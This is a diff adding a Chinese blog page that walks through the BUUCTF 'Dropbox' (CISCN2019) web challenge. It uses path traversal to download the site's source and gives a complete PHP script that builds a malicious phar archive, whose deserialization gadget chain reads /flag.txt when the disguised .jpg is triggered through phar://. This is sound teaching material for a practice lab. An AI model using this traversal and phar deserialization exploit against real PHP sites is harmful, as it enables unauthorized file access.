@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"honywen.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","Pisces | Gemini":240,"width":300,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="来源信息 BUUCTF 题目名称：Dropbox 类型：Web 难度：★★★★☆ 题目地址：链接 题目内容：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Dropbox-CTF">
+<meta property="og:url" content="http://honywen.com/2021/06/06/Dropbox-CTF/index.html">
+<meta property="og:site_name" content="小咕✨">
+<meta property="og:description" content="来源信息 BUUCTF 题目名称：Dropbox 类型：Web 难度：★★★★☆ 题目地址：链接 题目内容：">
+<meta property="og:locale">
+<meta property="og:image" content="https://i.loli.net/2021/06/06/6pEXThuGkKL7i93.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/06/hR5EFd1XS4liKMG.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/06/QrND6YHptqWJaPB.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/06/2FUIbOYMPcn6rVm.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/06/WwTK4CpFVloytAB.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/06/i5qJ6GgQcUAensT.png">
+<meta property="article:published_time" content="2021-06-06T08:33:08.000Z">
+<meta property="article:modified_time" content="2021-06-07T02:35:15.386Z">
+<meta property="article:author" content="honywen">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="BUUCTF">
+<meta property="article:tag" content="CISCN2019 华北赛区">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/06/06/6pEXThuGkKL7i93.png">
+
+<link rel="canonical" href="http://honywen.com/2021/06/06/Dropbox-CTF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>Dropbox-CTF | 小咕✨</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">小咕✨</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Everything is fine</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a>
+
+  </li>
+        <li class="menu-item menu-item-commonweal">
+
+    <a href="/commonweal/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://honywen.com/2021/06/06/Dropbox-CTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="honywen">
+      <meta itemprop="description" content="多多指教">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小咕✨">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Dropbox-CTF
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-06-06 16:33:08" itemprop="dateCreated datePublished" datetime="2021-06-06T16:33:08+08:00">2021-06-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-06-07 10:35:15" itemprop="dateModified" datetime="2021-06-07T10:35:15+08:00">2021-06-07</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2021/06/06/Dropbox-CTF/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/06/06/Dropbox-CTF/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="来源信息"><a href="#来源信息" class="headerlink" title="来源信息"></a>来源信息</h2><ul>
+<li>BUUCTF</li>
+<li>题目名称：Dropbox</li>
+<li>类型：Web</li>
+<li>难度：★★★★☆</li>
+<li>题目地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web1]Dropbox">链接</a></li>
+<li>题目内容：</li>
+</ul>
+<a id="more"></a>
+
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>打开链接就是登陆页面，第一反应就是sql注入，但是试了一会没有成功，看到了**<em>注册**</em>按钮，直接注册登陆。</p>
+<p><img src="https://i.loli.net/2021/06/06/6pEXThuGkKL7i93.png" alt="截屏2021-06-06 下午4.36.00.png"></p>
+<p>注册用户，完成登陆，发现后台有登陆按钮，试试文件上传，看能不能传个🐎。</p>
+<p><img src="https://i.loli.net/2021/06/06/hR5EFd1XS4liKMG.png" alt="截屏2021-06-06 下午4.38.52.png"></p>
+<p><img src="https://i.loli.net/2021/06/06/QrND6YHptqWJaPB.png" alt="截屏2021-06-06 下午4.59.10.png"></p>
+<p>在上传图片的时候发现会调用upload.php，下载的时候会调用download.php。同时成功上传文件之后会发现下载的路径都是#，我们无法获取上传文件的绝对路径。</p>
+<p>考虑修改文件名是否能下载到上层目录的网站源码，分别测试../index.php和../../index.php后下载到index.php的内容，同理下载delete.php,upload.php，download.php,再对剩下的网站文件进行下载后代码审计。</p>
+<p><img src="https://i.loli.net/2021/06/06/2FUIbOYMPcn6rVm.png" alt="截屏2021-06-06 下午5.18.52.png"><br>在login.php中，发现了上传文件之后的绝对路径。</p>
+<p>但是再次尝试了传🐎，还是无用。到此可以确定不是文件上传了。</p>
+<p>看到了提示说是phar反序列化漏洞。</p>
+<h3 id="phar"><a href="#phar" class="headerlink" title="phar"></a>phar</h3><p>PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件。如果你使用的是 PHP 5.3 或更高版本，那么Phar后缀文件是默认开启支持的，你不需要任何其他的安装就可以使用它。**<em>phar格式归档文件可以直接执行**</em>，它的产生依赖于Phar扩展，由自己编写的php脚本产生</p>
+<p>详情可以查看这篇文<a target="_blank" rel="noopener" href="https://www.webhek.com/post/packaging-your-php-apps-with-phar.html">PHP开发常识：什么是Phar?</a></p>
+<p>创建phar文件首先在php.ini中修改phar.readonly这个选项，将其修改为0:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar.readonly &#x3D; 0</span><br></pre></td></tr></table></figure>
+
+<h4 id="phar结构"><a href="#phar结构" class="headerlink" title="phar结构"></a>phar结构</h4><ul>
+<li><p>stub</p>
+<p>  phar 文件标识，格式为 xxx<?php xxx; __HALT_COMPILER();?>；</p>
+</li>
+<li><p>manifest</p>
+<p>  压缩文件的属性等信息，以序列化存储；</p>
+</li>
+<li><p>contents</p>
+<p>  压缩文件的内容；</p>
+</li>
+<li><p>signature</p>
+<p>  签名，放在文件末尾；</p>
+</li>
+</ul>
+<p>这里有两个关键点：</p>
+<ol>
+<li>是文件标识，必须以__HALT_COMPILER();?&gt;结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者pdf文件来绕过一些上传限制；</li>
+<li>是反序列化，phar存储的meta-data信息以序列化方式存储，当文件操作函数通过phar://伪协议解析phar文件时就会将数据反序列化，而这样的文件操作函数有很多。</li>
+</ol>
+<p><img src="https://i.loli.net/2021/06/06/WwTK4CpFVloytAB.png" alt="截屏2021-06-06 下午7.13.26.png"></p>
+<p>经过代码审计发现delete.php可以利用.$file-&gt;detele();再看class.php里的file类的delete方法:</p>
+<p>delete.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(&quot;Content-type: application&#x2F;json&quot;);</span><br><span class="line">    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; true, &quot;error&quot; &#x3D;&gt; &quot;&quot;);</span><br><span class="line">    echo json_encode($response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>class.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function detele() &#123;</span><br><span class="line">        unlink($this-&gt;filename);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>unlink可以反序列化,而且delete.php文件include了class.php,也就可以利用FileList类的__destruct()方法,满足攻击的三个条件:</p>
+<ol>
+<li>phar文件要能够上传到服务器端。</li>
+<li>要有可用的魔术方法作为“跳板”。</li>
+<li>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。<br>然后分析class.php类的结构关系,构造脚本生成phar文件:</li>
+</ol>
+<p>payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class User &#123;</span><br><span class="line">        public $db;</span><br><span class="line">    &#125; </span><br><span class="line">    class File&#123;</span><br><span class="line">        public $filename;</span><br><span class="line">        public function __construct($name)&#123;</span><br><span class="line">            $this-&gt;filename&#x3D;$name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class FileList &#123;</span><br><span class="line">        private $files;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;files&#x3D;array(new File(&#39;&#x2F;flag.txt&#39;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    $o &#x3D; new User();</span><br><span class="line">    $o-&gt;db &#x3D;new FileList();</span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar &#x3D; new Phar(&quot;phar.phar&quot;);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub</span><br><span class="line">    $phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件</span><br><span class="line">    &#x2F;&#x2F;签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>先调用了User类，User类destruct的时候，调用了db.close方法，而这里的db是Filelist类的对象，所以调用了Filelist类的close()方法，但是Filelist又不存在这个方法，所以调用了call方法，<br>call方法会调用file的close方法，也就是/flag.txt调用close方法，也就是包含这个文件。最后，Filelist类调用destruct方法，打印出函数执行结果，也就是根目录下flag.txt文件的内容</p>
+<p>_call方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">为了避免当调用的方法不存在时产生错误，而意外的导致程序中止，可以使用 __call() 方法来避免。</span><br><span class="line"></span><br><span class="line">该方法在调用的方法不存在时会自动调用，程序仍会继续执行下去。</span><br></pre></td></tr></table></figure>
+
+
+<p>之后将生成的phar文件后缀改为jpg上传。</p>
+<p>接下来再点击删除文件，将文件名改为phar://phar.jpg即可获得flag</p>
+<p><img src="https://i.loli.net/2021/06/06/i5qJ6GgQcUAensT.png" alt="截屏2021-06-06 下午8.54.58.png"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"># Web</a>
+              <a href="/tags/BUUCTF/" rel="tag"># BUUCTF</a>
+              <a href="/tags/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA/" rel="tag"># CISCN2019 华北赛区</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/05/19/PBCNN-%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/" rel="prev" title="PBCNN-论文笔记">
+      <i class="fa fa-chevron-left"></i> PBCNN-论文笔记
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/07/21/%E6%B7%B7%E5%90%88%E8%AF%AD%E4%B9%89%E4%BB%A3%E7%A0%81%E8%A1%A8%E7%A4%BA-%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/" rel="next" title="混合语义代码表示-论文笔记">
+      混合语义代码表示-论文笔记 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A5%E6%BA%90%E4%BF%A1%E6%81%AF"><span class="nav-number">1.</span> <span class="nav-text">来源信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">解题过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#phar"><span class="nav-number">2.1.</span> <span class="nav-text">phar</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#phar%E7%BB%93%E6%9E%84"><span class="nav-number">2.1.1.</span> <span class="nav-text">phar结构</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="honywen"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">honywen</p>
+  <div class="site-description" itemprop="description">多多指教</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/lxyeternal" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;lxyeternal" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1796369212@qq.com" title="E-Mail → mailto:1796369212@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/weixin_39641975" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_39641975" rel="noopener" target="_blank"><i class="fab fa-stack-overflow fa-fw"></i>CSDN</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/yourname" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;yourname" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://honywen.com/" title="http:&#x2F;&#x2F;honywen.com">Title</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">honywen</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'XtTLwDG0JPdYJFC2zH1ULGMN-gzGzoHsz',
+      appKey     : 'E1vcmMuSfPfzUqtr2j4z9T0N',
+      placeholder: "Just go go",
+      avatar     : '/uploads/avatar.jpg',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
